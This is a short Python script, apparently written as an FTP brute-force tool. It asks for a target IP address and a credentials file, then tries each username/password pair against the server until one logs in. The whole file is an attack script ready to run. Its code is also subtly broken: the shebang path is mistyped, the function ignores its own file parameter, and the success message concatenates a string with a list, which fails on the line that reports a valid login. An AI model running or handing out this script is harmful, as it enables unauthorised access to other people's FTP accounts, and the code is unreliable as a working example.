#!/ur/bin/env python

# Author:Gokan Bektas
# Description: 

import ftplib

def bruteLogin(hostname, passwordFile):
    try:
        passwordFile = open(passFile, 'r')
        
    except:
        print('[!!] File does not exist! ')
        
    for line in passwordFile.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, passWord)
            print('[+] Login succueded with: ' + userName + '/' + [passWord])
            ftp.quit()
            return(userName, passWord)
        except:
            pass
        
    print('[-] Password not in list! ')
    

host = input('[+] Enter a target IP address: ')
passFile = input('[*] Enter the path for the user/password file: ')
bruteLogin(host, passFile)